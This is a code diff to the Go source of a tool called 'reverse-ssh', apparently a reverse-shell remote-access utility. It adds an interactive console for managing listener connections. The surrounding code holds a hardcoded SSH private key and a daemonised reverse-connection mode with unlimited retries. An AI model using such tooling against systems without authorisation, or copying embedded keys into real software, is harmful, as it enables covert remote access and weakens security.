@@ -28,6 +28,7 @@ import (
 	"reverse-ssh/server"
 	"syscall"
 
+	"github.com/desertbit/grumble"
 	"github.com/gliderlabs/ssh"
 )
 
@@ -48,10 +49,11 @@ var (
 	reversePWD = ""
 	reverseKey = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACAbKAmUnINfuKOO7p1CedqeOkea29A6GvN65C4h2nlQ5wAAAJjwtxy78Lcc\nuwAAAAtzc2gtZWQyNTUxOQAAACAbKAmUnINfuKOO7p1CedqeOkea29A6GvN65C4h2nlQ5w\nAAAEBI7ubrJedFo/exWQIjC0qr2XKNLl+JcwKctWEPZXzL5xsoCZScg1+4o47unUJ52p46\nR5rb0Doa83rkLiHaeVDnAAAAE2VkeUBXSU4tVlZPODI0VTJLVksBAg==\n-----END OPENSSH PRIVATE KEY-----\n"
 
-	retryMax   = -1
-	foreground = false
-	keep       = false
-	noDaemon   = false
+	retryMax    = -1
+	interactive = false
+	foreground  = false
+	keep        = false
+	noDaemon    = false
 )
 
 func StripSlice(slice []string, element string) []string {
@@ -106,6 +108,7 @@ func setupParameters() *core.Params {
 	return &p
 }
 func main() {
+	flag.BoolVar(&interactive, "i", false, "")
 	flag.BoolVar(&foreground, "nd", false, "")
 	flag.BoolVar(&noDaemon, "dd", false, "")
 	flag.BoolVar(&keep, "k", false, "")
@@ -173,7 +176,44 @@ func main() {
 
 	//run(p, &server)
 	if p.Listen {
-		server.RunL(p, &sshServer)
+		if interactive {
+			var app = grumble.New(&grumble.Config{
+				Name:            "app",
+				Description:     "short app description",
+				IgnoreFlagError: true,
+			})
+			app.AddCommand(&grumble.Command{
+				Name:    "daemon",
+				Help:    "run the daemon",
+				Aliases: []string{"run"},
+				Run: func(c *grumble.Context) error {
+					go server.RunL(p, &sshServer)
+					return nil
+				},
+			})
+			app.AddCommand(&grumble.Command{
+				Name: "reload",
+				Help: "reload server",
+				Run: func(c *grumble.Context) error {
+					sshServer.Close()
+					go server.RunL(p, &sshServer)
+					return nil
+				},
+			})
+			app.AddCommand(&grumble.Command{
+				Name:    "list",
+				Help:    "list connections",
+				Aliases: []string{"ls"},
+				Run: func(c *grumble.Context) error {
+					c.App.Println(server.ConnList)
+					return nil
+				},
+			})
+
+			grumble.Main(app)
+		} else {
+			server.RunL(p, &sshServer)
+		}
 	} else {
 		RunRThenCheck(p, &sshServer, reversePWD, reverseKey, retryMax)
 	}
